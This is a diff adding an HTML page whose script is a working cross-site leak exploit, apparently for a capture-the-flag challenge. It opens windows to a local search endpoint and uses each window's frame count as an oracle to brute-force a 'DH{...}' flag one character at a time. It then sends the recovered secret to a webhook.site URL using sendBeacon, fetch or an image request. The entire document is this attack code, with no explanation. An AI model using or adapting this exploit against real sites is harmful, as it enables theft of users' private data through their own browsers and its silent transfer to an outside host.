@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      const WEBHOOK_URL = "https://webhook.site/9dc0685b-6d18-43cc-bdd7-77252fbb0b68/";
+      const TARGET_URL = "http://127.0.0.1:8000/search?query=";
+
+      function sleep(ms) {
+        return new Promise((resolve) => setTimeout(resolve, ms));
+      }
+
+      async function count(query) {
+        const w = window.open(
+          `${TARGET_URL}${encodeURIComponent(query)}`,
+          "_blank"
+        );
+
+        await sleep(500);
+
+        const frameCount = w.length;
+        w.close();
+        return frameCount;
+      }
+
+      async function search(prefix) {
+        try {
+          return (await count(prefix)) > 0;
+        } catch (e) {
+          return false;
+        }
+      }
+
+      async function brute() {
+        const prefix = "DH{";
+        const suffix = "}";
+        const chars = "0123456789abcdef";
+        let secret = "";
+        const secretLength = 16 - prefix.length - suffix.length;
+
+        for (let i = 0; i < secretLength; i++) {
+          for (const c of chars) {
+            const candidate = prefix + secret + c;
+
+            if (await search(candidate)) {
+              secret += c;
+              console.log(`found: ${prefix + secret}`);
+              break;
+            }
+          }
+        }
+
+        return `${prefix}${secret}${suffix}`;
+      }
+
+      async function sendToWebhook(flag) {
+        const url = `${WEBHOOK_URL}?leak=${encodeURIComponent(flag)}`;
+
+        try {
+          if (navigator.sendBeacon) {
+            navigator.sendBeacon(url);
+            return;
+          }
+        } catch (e) {}
+
+        try {
+          await fetch(url, {
+            method: "GET",
+            mode: "no-cors",
+            cache: "no-store",
+          });
+          return;
+        } catch (e) {}
+
+        (new Image()).src = url;
+      }
+
+      (async () => {
+        const flag = await brute();
+        await sendToWebhook(flag);
+      })();
+    </script>
+  </body>
+</html>
